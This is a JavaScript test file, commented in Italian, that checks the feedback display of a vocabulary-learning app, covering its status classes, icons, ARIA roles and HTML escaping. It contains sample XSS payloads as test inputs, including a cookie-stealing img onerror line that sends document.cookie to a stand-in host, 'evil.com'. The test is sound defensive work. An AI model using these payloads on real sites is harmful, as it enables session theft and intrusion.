'use strict';
const Feedback = require('../public/js/feedback');
const { buildHTML, esc, STATUS_CFG, defaultActions } = Feedback;

let passed = 0, failed = 0;
function assert(cond, desc) {
  if (cond) { console.log(`  ✓ ${desc}`); passed++; }
  else       { console.error(`  ✗ ${desc}`); failed++; }
}
function makeEval(status, overrides = {}) {
  return {
    status, accepted: status.startsWith('correct'), score: 1.0,
    userAnswer: 'la stanza', targetAnswer: 'la camera', matchedAnswer: null,
    feedbackTitle: null, feedbackExplanation: null,
    saveToErrorNotebook: false, secondaryIssues: [],
    needsContentReview: false,
    ...overrides,
  };
}

// ── esc ──────────────────────────────────────────────────────────────────────
console.log('\nesc (XSS safety):');
assert(esc('<script>') === '&lt;script&gt;',              'tag script escaped');
assert(esc('"hello"') === '&quot;hello&quot;',            'virgolette escaped');
assert(esc("it's") === 'it&#039;s',                      'apostrofo escaped');
assert(esc('<img src=x onerror=alert(1)>').indexOf('<') === -1, 'img tag escaped');
assert(esc(null) === '',  'null → vuoto');
assert(esc(undefined) === '', 'undefined → vuoto');
assert(esc(42) === '42', 'numero → stringa');

// ── defaultActions ──────────────────────────────────────────────────────────
console.log('\ndefaultActions:');
{
  const a = defaultActions('correct_exact');
  assert(a.showContinue === true,  'correct_exact: continua');
  assert(a.showRetry === false,    'correct_exact: no retry');
  assert(a.showNotebook === false, 'correct_exact: no notebook');
}
{
  const a = defaultActions('incorrect');
  assert(a.showContinue === true,  'incorrect: continua');
  assert(a.showRetry === true,     'incorrect: retry');
  assert(a.showNotebook === true,  'incorrect: notebook');
}
{
  const a = defaultActions('almost_correct_gender');
  assert(a.showRetry === true,     'almost_correct_gender: retry');
  assert(a.showNotebook === false, 'almost_correct_gender: no notebook');
}
{
  const a = defaultActions('ambiguous');
  assert(a.showContinue === true, 'ambiguous: continua');
  assert(a.showReport === true,   'ambiguous: segnala');
}

// ── buildHTML: classe CSS corretta ───────────────────────────────────────────
console.log('\nbuildHTML — classi CSS:');
const statusTests = [
  ['correct_exact',                  'fb-correct'],
  ['correct_normalized',             'fb-correct'],
  ['correct_synonym',                'fb-synonym'],
  ['correct_contextual',             'fb-contextual'],
  ['almost_correct_spelling',        'fb-almost'],
  ['almost_correct_missing_article', 'fb-almost'],
  ['almost_correct_wrong_article',   'fb-almost'],
  ['almost_correct_gender',          'fb-almost'],
  ['almost_correct_number',          'fb-almost'],
  ['incorrect_related_word',         'fb-wrong'],
  ['incorrect',                      'fb-wrong'],
  ['ambiguous',                      'fb-ambiguous'],
];
statusTests.forEach(([status, cls]) => {
  const html = buildHTML(makeEval(status));
  assert(html.includes(cls), `${status} → classe ${cls}`);
});

// ── buildHTML: icone ─────────────────────────────────────────────────────────
console.log('\nbuildHTML — icone:');
assert(buildHTML(makeEval('correct_exact')).includes('✓'),   'correct: ✓');
assert(buildHTML(makeEval('incorrect')).includes('✕'),       'incorrect: ✕');
assert(buildHTML(makeEval('almost_correct_spelling')).includes('◐'), 'almost: ◐');
assert(buildHTML(makeEval('ambiguous')).includes('?'),       'ambiguous: ?');
assert(buildHTML(makeEval('correct_contextual')).includes('ⓘ'), 'contextual: ⓘ');

// ── buildHTML: role ARIA ─────────────────────────────────────────────────────
// Tutti gli stati usano role="status" + aria-live="polite".
// role="alert" è riservato a errori tecnici, non a risposte sbagliate.
console.log('\nbuildHTML — ARIA role:');
assert(buildHTML(makeEval('correct_exact')).includes('role="status"'),          'correct: role=status');
assert(buildHTML(makeEval('incorrect')).includes('role="status"'),              'incorrect: role=status (non alert)');
assert(buildHTML(makeEval('almost_correct_spelling')).includes('role="status"'),'almost: role=status (non alert)');
assert(buildHTML(makeEval('ambiguous')).includes('role="status"'),              'ambiguous: role=status');
assert(buildHTML(makeEval('correct_exact')).includes('aria-live="polite"'),     'correct: polite');
assert(buildHTML(makeEval('incorrect')).includes('aria-live="polite"'),         'incorrect: polite (non assertive)');
assert(buildHTML(makeEval('almost_correct_gender')).includes('aria-live="polite"'), 'almost_gender: polite');
assert(!buildHTML(makeEval('incorrect')).includes('role="alert"'),              'incorrect: nessun role=alert');

// ── buildHTML: titolo ────────────────────────────────────────────────────────
console.log('\nbuildHTML — titolo:');
assert(buildHTML(makeEval('correct_exact', { feedbackTitle: 'Corretto!' })).includes('Corretto!'), 'titolo custom');
assert(buildHTML(makeEval('incorrect', { feedbackTitle: 'Non corretto' })).includes('Non corretto'), 'titolo sbagliato');

// ── buildHTML: blocco risposta ───────────────────────────────────────────────
console.log('\nbuildHTML — blocco risposta:');
{
  const html = buildHTML(makeEval('correct_synonym', {
    userAnswer: 'la stanza', targetAnswer: 'la camera', matchedAnswer: 'la stanza' }));
  assert(html.includes('la stanza'),                    'risposta utente visibile');
  assert(html.includes('la camera') || html.includes('Parola obiettivo'), 'target visibile');
  assert(html.includes('fb-answer-block'),              'blocco risposta presente');
}
{
  // Esatto: nessun blocco risposta
  const html = buildHTML(makeEval('correct_exact'));
  assert(!html.includes('fb-answer-block'), 'esatto: nessun blocco risposta');
}
{
  // Compact: nessun blocco risposta
  const html = buildHTML(makeEval('incorrect'), {}, { compact: true });
  assert(!html.includes('fb-answer-block'), 'compact: nessun blocco risposta');
}

// ── buildHTML: spiegazione ───────────────────────────────────────────────────
console.log('\nbuildHTML — spiegazione:');
{
  const html = buildHTML(makeEval('almost_correct_gender', {
    feedbackExplanation: '"Mano" è femminile: si dice "la mano".' }));
  // Le virgolette vengono escaped in &quot; — cerchiamo testo senza virgolette
  assert(html.includes('Mano') && html.includes('femminile'), 'spiegazione genere visibile');
  assert(html.includes('fb-explanation'),     'classe fb-explanation');
}
{
  // Nessuna spiegazione per esatto
  const html = buildHTML(makeEval('correct_exact', { feedbackExplanation: null }));
  assert(!html.includes('fb-explanation'), 'esatto: nessuna spiegazione');
}

// ── buildHTML: esempio e alternative ────────────────────────────────────────
console.log('\nbuildHTML — esempio e alternative:');
{
  const html = buildHTML(makeEval('correct_synonym'), { example: 'La stanza è grande.' });
  assert(html.includes('La stanza è grande.'), 'esempio visibile');
  assert(html.includes('fb-example'),          'classe fb-example');
}
{
  const html = buildHTML(makeEval('incorrect'), { alternatives: ['la stanza', 'il locale'] });
  assert(html.includes('la stanza'),           'alternativa 1 visibile');
  assert(html.includes('il locale'),           'alternativa 2 visibile');
  assert(html.includes('fb-alternatives'),     'classe fb-alternatives');
}

// ── buildHTML: secondaryIssues ───────────────────────────────────────────────
console.log('\nbuildHTML — secondaryIssues:');
{
  const html = buildHTML(makeEval('almost_correct_number', {
    secondaryIssues: ['article_gender'] }));
  assert(html.includes('genere articolo') || html.includes('article_gender') || html.includes('fb-secondary'),
    'secondary issue visibile');
}

// ── buildHTML: ambiguo senza penalità ────────────────────────────────────────
console.log('\nbuildHTML — ambiguo:');
{
  const html = buildHTML(makeEval('ambiguous', { feedbackExplanation: null }));
  assert(html.includes('fb-ambiguous'),    'classe ambigua');
  assert(html.includes('?'),               'icona ?');
  assert(html.includes('progressi') || html.includes('conteggiata'), 'testo nessuna penalità');
}

// ── XSS: risposta utente mai eseguita come HTML ──────────────────────────────
console.log('\nbuildHTML — XSS:');
{
  const xss = '<img src=x onerror=alert(1)>';
  const html = buildHTML(makeEval('incorrect', {
    userAnswer: xss,
    targetAnswer: xss,
    feedbackExplanation: `Hai scritto ${xss}.` }));
  assert(!html.includes('<img '),        'tag img non eseguibile nel DOM');
  assert(html.includes('&lt;img'),       'img tag escaped correttamente');
  // onerror= come testo (non in tag) è sicuro — il pericolo è solo <img onerror>
  assert(!html.includes('<img '),        'nessun tag img eseguibile');
}
{
  // Apostrofi nel contenuto
  const html = buildHTML(makeEval('almost_correct_gender', {
    userAnswer: "l'occhio", targetAnswer: "l'orecchio",
    feedbackExplanation: "L'orecchio è maschile." }));
  assert(html.includes("L&#039;orecchio") || html.includes("L'orecchio"), 'apostrofi gestiti');
}

// ── XSS esteso ───────────────────────────────────────────────────────────────
console.log('\nbuildHTML — XSS esteso:');
{
  const scriptTag = '<script>alert(1)<\/script>';
  const html = buildHTML(makeEval('incorrect', {
    userAnswer: scriptTag, targetAnswer: scriptTag, feedbackExplanation: scriptTag }));
  assert(!html.includes('<script>'), 'script tag non eseguibile');
  assert(html.includes('&lt;script&gt;'), 'script tag escaped');
}
{
  const btnTag = '<button autofocus onclick=alert(1)>Continua</button>';
  const html = buildHTML(makeEval('incorrect', { feedbackExplanation: btnTag }));
  assert(!html.includes('<button autofocus'), 'button autofocus non iniettato');
  assert(html.includes('&lt;button'), 'button escaped');
}
{
  const special = '&<>"\'`';
  const html = buildHTML(makeEval('incorrect', {
    userAnswer: special, targetAnswer: special, feedbackExplanation: `Test: ${special}` }));
  assert(html.includes('&amp;'),  '& → &amp;');
  assert(html.includes('&lt;'),   '< → &lt;');
  assert(html.includes('&gt;'),   '> → &gt;');
  assert(html.includes('&quot;'), '" → &quot;');
  assert(html.includes('&#039;'), "' → &#039;");
}
{
  // Verifica che il titolo e la label siano escaped
  const evilTitle = '<b onclick=alert()>Corretto</b>';
  const html = buildHTML(makeEval('correct_exact', { feedbackTitle: evilTitle }));
  assert(!html.includes('<b onclick'), 'titolo non esegue HTML');
  assert(html.includes('&lt;b'), 'titolo escaped');
}
{
  // Esempio con contenuto malevolo
  const evilExample = '<img src=x onerror=fetch("evil.com?d="+document.cookie)>';
  const html = buildHTML(makeEval('correct_synonym'), { example: evilExample });
  assert(!html.includes('<img src=x'), 'esempio img non eseguibile');
  assert(html.includes('&lt;img'), 'esempio escaped');
}

// ── STATUS_CFG completo ─────────────────────────────────────────────────────
console.log('\nSTATUS_CFG — copertura:');
const expectedStatuses = [
  'correct_exact','correct_normalized','correct_synonym','correct_contextual',
  'almost_correct_spelling','almost_correct_missing_article','almost_correct_wrong_article',
  'almost_correct_gender','almost_correct_number',
  'incorrect_related_word','incorrect','ambiguous',
];
expectedStatuses.forEach(s => {
  assert(s in STATUS_CFG, `STATUS_CFG copre "${s}"`);
});

// ── Riepilogo ────────────────────────────────────────────────────────────────
console.log(`\n─────────────────────────────────────`);
console.log(`Risultato: ${passed} passati, ${failed} falliti su ${passed+failed} totali`);
if (failed > 0) { console.error(`\n⚠ ${failed} FALLITI`); process.exit(1); }
else console.log('\n✓ Tutti i test passati!');
